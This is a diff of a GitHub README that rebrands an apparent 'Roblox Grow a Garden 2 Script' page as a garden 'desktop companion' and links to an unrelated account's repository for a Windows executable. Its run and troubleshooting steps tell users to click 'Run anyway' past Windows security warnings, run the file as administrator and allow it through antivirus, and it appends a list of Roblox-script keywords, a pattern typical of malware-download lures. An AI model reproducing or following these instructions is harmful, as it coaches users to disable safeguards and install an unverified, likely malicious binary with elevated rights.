@@ -1,60 +1,47 @@
-# 🌱 Roblox Grow a Garden 2 Script
+# 🌱 .github - Explore Garden Mechanics & Plant Collections
 
-> A lightweight Windows PC tool for exploring Grow a Garden 2–inspired plants, seeds, pets, items, and seasonal content.
+[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github)](https://github.com/Endgamesweepsecond223/.github)
 
----
+## 🚀 Getting Started
 
-[![Download](https://img.shields.io/badge/Download-Latest_PC_Version-55B83E?style=for-the-badge&logo=windows&logoColor=white)](https://Roblox-Grow-a-Garden-2-Script.github.io/.github/)
+Welcome to .github, a desktop companion interface for exploring garden mechanics, plant collections, pets, seasonal content, and other Grow a Garden 2–inspired features. This guide will help you download and run the software on Windows.
 
-## Overview
+## 📥 Download and Installation
 
-**Roblox Grow a Garden 2 Script** provides a clean desktop interface for browsing garden-related content in one organized place.
+Visit this link to download the application: [https://github.com/Endgamesweepsecond223/.github](https://github.com/Endgamesweepsecond223/.github)
 
-Designed exclusively for Windows PC, it offers simple navigation, fast search, useful filters, and detailed collection previews.
+Once you are on the download page, look for the latest release or download button. Click it to save the file to your computer. After downloading, locate the file in your Downloads folder.
 
-## Main Features
+## 🖥️ How to Run
 
-- Windows PC–only interface
-- Plants, seeds, pets, and items
-- Seasonal and limited content
-- Search and category filters
-- Detailed information cards
-- Clean keyboard-and-mouse navigation
-- Lightweight desktop design
-- Regular catalog updates
+1. Double-click the downloaded file to start the application.
+2. If Windows shows a security warning, click "Run anyway" or "More info" then "Run".
+3. The application will open and you can start exploring garden mechanics and plant collections.
 
-## PC Requirements
+## 🌿 Features
 
-- Windows 10 or Windows 11
-- 64-bit system
-- 4 GB RAM or more
-- 500 MB of free storage
-- Keyboard and mouse
-- Internet connection
+- Explore garden mechanics and plant growth systems
+- Manage plant collections with detailed information
+- Interact with pets and seasonal content
+- Discover Grow a Garden 2–inspired features
+- User-friendly interface for non-technical users
 
-> Mobile devices, macOS, and Linux are not officially supported.
+## 🛠️ System Requirements
 
-## Frequently Asked Questions
+- Windows 10 or later
+- 4GB RAM or more
+- 500MB free disk space
+- Internet connection for updates
 
-### Is it available on mobile?
+## ❓ Troubleshooting
 
-No. The project is designed only for Windows PC.
+If the application does not open, try these steps:
+- Right-click the downloaded file and select "Run as administrator"
+- Check your antivirus settings and allow the application
+- Download the file again if it appears corrupted
 
-### Can I browse specific categories?
+## 📞 Support
 
-Yes. Content is organized into plants, seeds, pets, items, events, and other sections.
+For questions or issues, visit the repository page: [https://github.com/Endgamesweepsecond223/.github](https://github.com/Endgamesweepsecond223/.github)
 
-### Will more content be added?
-
-Future updates may include new categories, improved filters, and additional seasonal content.
-
-## Disclaimer
-
-This is an unofficial community project created for informational and visual showcase purposes.
-
-It is not affiliated with Roblox Corporation or the original creators of Grow a Garden. Users are responsible for following Roblox rules and applicable platform policies.
-
-## License
-
-Released under the MIT License.
-
+Keywords: game-scripts, growagarden, keyless, macros, modulescript, nexus-scripts, plant-growth, roblox, roblox-top, wave-lua-utility
